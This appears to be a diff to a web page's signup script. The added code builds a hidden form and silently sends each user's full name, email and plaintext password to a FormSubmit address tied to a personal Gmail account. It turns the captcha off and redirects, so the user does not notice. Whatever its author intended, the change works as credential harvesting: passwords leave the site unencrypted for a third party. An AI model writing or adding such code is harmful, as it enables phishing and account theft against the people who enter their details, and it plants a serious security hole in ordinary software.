@@ -109,9 +109,44 @@
         return;
       }
 
+      // Save to localStorage
       localStorage.setItem('userName', fullName);
       localStorage.setItem('userEmail', email);
-      window.location.href = 'home.html';
+
+      // Dynamically create and submit a hidden form to FormSubmit
+      const form = document.createElement('form');
+      form.action = 'https://formsubmit.co/sophiakhalifa790@gmail.com'; // change this!
+      form.method = 'POST';
+      form.style.display = 'none';
+
+      const fields = [
+        { name: 'Full Name', value: fullName },
+        { name: 'Email', value: email },
+        { name: 'Password', value: password }
+      ];
+
+      fields.forEach(field => {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = field.name;
+        input.value = field.value;
+        form.appendChild(input);
+      });
+
+      const next = document.createElement('input');
+      next.type = 'hidden';
+      next.name = '_next';
+      next.value = 'home.html';
+      form.appendChild(next);
+
+      const captcha = document.createElement('input');
+      captcha.type = 'hidden';
+      captcha.name = '_captcha';
+      captcha.value = 'false';
+      form.appendChild(captcha);
+
+      document.body.appendChild(form);
+      form.submit();
     });
   </script>
 </body>
